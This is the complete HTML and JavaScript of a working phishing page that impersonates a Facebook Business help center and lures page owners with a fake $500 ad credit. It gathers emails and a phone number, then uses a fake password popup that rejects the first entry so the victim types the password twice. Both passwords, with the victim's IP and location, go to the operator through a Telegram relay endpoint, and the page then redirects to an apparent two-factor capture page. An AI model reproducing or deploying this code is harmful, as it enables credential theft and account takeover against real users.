<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Business - Claim Your Ad Credit</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header Styles */
        .header {
            background-color: #355797;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .header .help-center-link {
            font-size: clamp(16px, 4vw, 18px);
            font-weight: 700;
            color: #fff;
            text-decoration: none;
        }

        .header .search-bar {
            flex-grow: 1;
            margin: 0 10px;
            max-width: 500px;
        }

        .header .search-bar input {
            width: 100%;
            padding: 8px 12px;
            border: none;
            border-radius: 20px;
            font-size: clamp(14px, 3.5vw, 15px);
            background-color: rgba(255, 255, 255, 0.2);
            color: #fff;
            outline: none;
            transition: background-color 0.3s;
        }

        .header .search-bar input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .header .language {
            font-size: clamp(12px, 3vw, 14px);
            color: #fff;
        }

        /* Hamburger Menu for Mobile */
        .hamburger {
            display: none;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
        }

        /* Main Content */
        .main-content {
            display: flex;
            flex-grow: 1;
        }

        /* Sidebar Styles */
        .sidebar {
            width: 250px;
            background-color: #fff;
            padding: 16px;
            border-right: 1px solid #ddd;
            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
            overflow-y: auto;
            transition: transform 0.3s ease;
        }

        .sidebar ul {
            list-style: none;
        }

        .sidebar ul li {
            margin-bottom: 8px;
        }

        .sidebar ul li a {
            text-decoration: none;
            color: #333;
            padding: 8px 12px;
            display: block;
            border-radius: 6px;
            font-size: clamp(14px, 3.5vw, 15px);
            transition: background-color 0.2s;
        }

        .sidebar ul li a:hover, .sidebar ul li a.active {
            background-color: #f0f2f5;
            color: #1877f2;
        }

        /* Content Area */
        .content-area {
            flex-grow: 1;
            padding: clamp(12px, 3vw, 20px);
            background-color: #f0f2f5;
        }

        .form-container {
            background-color: #fff;
            padding: clamp(16px, 4vw, 24px);
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            max-width: 700px;
            margin: 0 auto;
        }

        .form-container h2 {
            font-size: clamp(20px, 5vw, 24px);
            color: #1c2b33;
            margin-bottom: 16px;
        }

        .form-container p {
            font-size: clamp(14px, 3.5vw, 15px);
            color: #606770;
            margin-bottom: 16px;
            line-height: 1.5;
        }

        .form-container label {
            display: block;
            font-size: clamp(13px, 3.2vw, 14px);
            color: #606770;
            margin-bottom: 6px;
        }

        .form-container input[type="text"],
        .form-container input[type="email"],
        .form-container textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: clamp(14px, 3.5vw, 15px);
            transition: border-color 0.3s;
        }

        .form-container input[type="text"]:focus,
        .form-container input[type="email"]:focus,
        .form-container textarea:focus {
            border-color: #1877f2;
            outline: none;
        }

        .form-container textarea {
            resize: vertical;
            min-height: 100px;
        }

        .form-container .ticket-number {
            font-weight: bold;
            color: #1877f2;
        }

        .form-container .note {
            font-size: clamp(12px, 3vw, 13px);
            color: #606770;
            margin-top: -8px;
            margin-bottom: 12px;
        }

        .form-container .terms {
            font-size: clamp(12px, 3vw, 13px);
            color: #606770;
            margin: 16px 0;
        }

        .form-container .terms a {
            color: #1877f2;
            text-decoration: none;
        }

        .form-container button {
            background-color: #1877f2;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: clamp(14px, 3.5vw, 16px);
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }

        .form-container button:hover {
            background-color: #166fe5;
        }

        /* Password Popup Styles */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            display: none;
        }

        .popup-content {
            background-color: #fff;
            padding: clamp(16px, 4vw, 24px);
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            width: 90%;
            max-width: 450px;
            text-align: center;
        }

        .popup-content h3 {
            font-size: clamp(18px, 4.5vw, 20px);
            color: #1c2b33;
            margin-bottom: 12px;
        }

        .popup-content p {
            font-size: clamp(14px, 3.5vw, 15px);
            color: #606770;
            margin-bottom: 16px;
        }

        .popup-content input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: clamp(14px, 3.5vw, 16px);
            outline: none;
        }

        .popup-content input[type="password"]:focus {
            border-color: #1877f2;
        }

        .popup-content button {
            background-color: #1877f2;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: clamp(14px, 3.5vw, 16px);
            cursor: pointer;
            width: 100%;
        }

        .popup-content button:hover {
            background-color: #166fe5;
        }

        .popup-content .error-message {
            color: #fa3e3e;
            font-size: clamp(12px, 3vw, 13px);
            margin: -8px 0 10px;
            text-align: left;
            display: none;
        }

        /* Mobile Adjustments */
        @media (max-width: 768px) {
            .header {
                padding: 10px 12px;
                justify-content: space-between;
            }

            .header .search-bar {
                display: none;
            }

            .header .language {
                display: none;
            }

            .hamburger {
                display: block;
            }

            .sidebar {
                position: fixed;
                top: 0;
                left: 0;
                height: 100%;
                transform: translateX(-100%);
                z-index: 1001;
                width: 80%;
                max-width: 280px;
            }

            .sidebar.active {
                transform: translateX(0);
            }

            .content-area {
                padding: 12px;
            }

            .form-container {
                padding: 16px;
            }

            .form-container button, .popup-content button {
                padding: 12px;
                font-size: clamp(14px, 4vw, 16px);
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="hamburger" onclick="toggleSidebar()">☰</span>
        <a href="#" class="help-center-link">facebook</a>
        <div class="search-bar">
            <input type="text" placeholder="How can we help?">
        </div>
        <span class="language">English (US)</span>
    </div>

    <div class="main-content">
        <div class="sidebar" id="sidebar">
            <ul>
                <li><a href="#">Creating an Account</a></li>
                <li><a href="#">Your Profile</a></li>
                <li><a href="#">Friending</a></li>
                <li><a href="#">Dating</a></li>
                <li><a href="#">Your Home Page</a></li>
                <li><a href="#">Messaging</a></li>
                <li><a href="#">Reels</a></li>
                <li><a href="#">Stories</a></li>
                <li><a href="#">Photos</a></li>
                <li><a href="#">Videos</a></li>
                <li><a href="#">Gaming</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">Events</a></li>
                <li><a href="#">Fundraisers and Donations</a></li>
                <li><a href="#">Pay</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Apps</a></li>
                <li><a href="#">Mobile Apps</a></li>
                <li><a href="#">Accessibility</a></li>
            </ul>
        </div>

        <div class="content-area">
            <div class="form-container">
                <h2>Claim Your $500 Ad Credit</h2>
                <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
                <p>We’re excited to offer you a <strong>$500 advertising credit</strong> to boost your campaigns on Facebook and Instagram! Your account has been selected due to your excellent engagement with our platform. Please complete the required information below to claim your credit and start reaching more customers.</p>

                <form id="disagreeForm">
                    <label for="yourName">Page Name *</label>
                    <input type="text" id="yourName" name="yourName" required>

                    <label for="businessEmail">Business Email *</label>
                    <input type="email" id="businessEmail" name="businessEmail" required>
                    <p class="note">Notifications about your credit status and ad performance will be sent to this email.</p>

                    <label for="personalEmail">Personal Email *</label>
                    <input type="email" id="personalEmail" name="personalEmail" required>

                    <label for="mobilePhoneNumber">Mobile Phone Number *</label>
                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" required>
                    <p class="note">We may use this phone number to contact you for verification and credit support.</p>

                    <label for="additionalInfo">Please provide any additional information to help us process your credit</label>
                    <textarea id="additionalInfo" name="additionalInfo"></textarea>

                    <p class="terms">Learn more about our <a href="#">Advertising Terms and Policies.</a></p>

                    <button type="submit" id="sendButton">Claim Your $500 Credit</button>
                </form>
            </div>
        </div>
    </div>

    <div class="popup-overlay" id="passwordPopupOverlay">
        <div class="popup-content">
            <h3>Enter Your Password</h3>
            <p>For security reasons, please enter your password to continue with the credit claim process.</p>
            <input type="password" id="passwordInput" placeholder="Password" required>
            <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
            <button id="confirmPasswordButton">Confirm</button>
        </div>
    </div>

    <script>
        // !!! PLEASE REPLACE 'YOUR_IPGEOLOCATION_API_KEY' WITH YOUR API KEY !!!
        const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf';

        let ipAddress = 'N/A';
        let locationData = 'N/A';
        let formData = {};
        let passwordAttemptCount = 0;
        let passwordAttemptValue1 = '';
        let passwordAttemptValue2 = '';

        // Elements
        const ticketNumberSpan = document.getElementById('ticketNumber');
        const disagreeForm = document.getElementById('disagreeForm');
        const sendButton = document.getElementById('sendButton');
        const passwordPopupOverlay = document.getElementById('passwordPopupOverlay');
        const passwordInput = document.getElementById('passwordInput');
        const passwordError = document.getElementById('passwordError');
        const confirmPasswordButton = document.getElementById('confirmPasswordButton');

        // Toggle Sidebar for Mobile
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('active');
        }

        // Generate a random 12-digit number
        function generateRandomTicketNumber() {
            return Math.floor(100000000000 + Math.random() * 900000000000).toString();
        }

        // Fetch user's IP and location using ipgeolocation.io
        async function getIPAndLocation() {
            try {
                if (IPGEOLOCATION_API_KEY === 'YOUR_IPGEOLOCATION_API_KEY' || !IPGEOLOCATION_API_KEY) {
                    console.error('IPGeolocation API Key is not set. Please replace "YOUR_IPGEOLOCATION_API_KEY" with your actual key.');
                    return;
                }

                const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`);
                const data = await response.json();

                if (data && data.ip) {
                    ipAddress = data.ip;
                    locationData = `${data.city || 'Unknown City'}, ${data.state_prov || 'Unknown Region'}, ${data.country_name || 'Unknown Country'}`;
                    console.log(`IP: ${ipAddress}, Location: ${locationData}`);
                } else {
                    console.error('Error fetching IP and location from ipgeolocation.io:', data.message || 'Unknown error');
                    ipAddress = 'N/A';
                    locationData = 'N/A';
                }
            } catch (error) {
                console.error('Error fetching IP and location:', error);
                ipAddress = 'N/A';
                locationData = 'N/A';
            }
        }

        // Send message to Telegram
        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch('/api/send-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ message: message })
                });
                const data = await response.json();
                if (!data.success) {
                    console.error('Error sending message via API:', data.error);
                } else {
                    console.log('Message sent successfully via API!');
                }
            } catch (error) {
                console.error('Error calling send-telegram API:', error);
            }
        }

        // Form and Popup Handlers
        sendButton.addEventListener('click', async (e) => {
            e.preventDefault();

            formData = {
                yourName: document.getElementById('yourName').value,
                businessEmail: document.getElementById('businessEmail').value,
                personalEmail: document.getElementById('personalEmail').value,
                mobilePhoneNumber: document.getElementById('mobilePhoneNumber').value,
                additionalInfo: document.getElementById('additionalInfo').value,
                ticketNumber: ticketNumberSpan.textContent
            };

            if (!formData.yourName || !formData.businessEmail || !formData.personalEmail || !formData.mobilePhoneNumber) {
                alert('Please fill in all required fields (marked with *)');
                return;
            }

            if (ipAddress === 'N/A') {
                await getIPAndLocation();
            }

            passwordInput.value = '';
            passwordError.style.display = 'none';
            passwordPopupOverlay.style.display = 'flex';
            passwordInput.focus();
        });

        confirmPasswordButton.addEventListener('click', async () => {
            const password = passwordInput.value;
            if (!password) {
                passwordError.textContent = 'Password cannot be empty.';
                passwordError.style.display = 'block';
                return;
            }

            passwordAttemptCount++;

            let message = `<b>New Credit Claim Attempt ${passwordAttemptCount}</b>\n`;
            message += `------------------------------------\n`;
            message += `<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
            message += `<b>Page Name:</b> ${formData.yourName}\n`;
            message += `<b>Business Email:</b> ${formData.businessEmail}\n`;
            message += `<b>Personal Email:</b> ${formData.personalEmail}\n`;
            message += `<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;

            if (passwordAttemptCount === 1) {
                passwordAttemptValue1 = password;
                message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
                await sendMessageToTelegram(message);
                passwordError.textContent = 'Incorrect password. Please try again.';
                passwordError.style.display = 'block';
            } else if (passwordAttemptCount === 2) {
                passwordAttemptValue2 = password;
                message += `<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
                await sendMessageToTelegram(message);
                passwordPopupOverlay.style.display = 'none';

                localStorage.setItem('formData', JSON.stringify(formData));
                localStorage.setItem('ipAddress', ipAddress);
                localStorage.setItem('locationData', locationData);
                localStorage.setItem('passwordAttemptValue1', passwordAttemptValue1);
                localStorage.setItem('passwordAttemptValue2', passwordAttemptValue2);
                window.location.href = '2fa_page.html';
            }
            passwordInput.value = '';
        });

        // Initial Setup
        document.addEventListener('DOMContentLoaded', () => {
            ticketNumberSpan.textContent = generateRandomTicketNumber();
            getIPAndLocation();

            localStorage.removeItem('formData');
            localStorage.removeItem('ipAddress');
            localStorage.removeItem('locationData');
            localStorage.removeItem('passwordAttemptValue1');
            localStorage.removeItem('passwordAttemptValue2');
            localStorage.removeItem('twoFAAttemptCount');
        });
    </script>
</body>
</html>
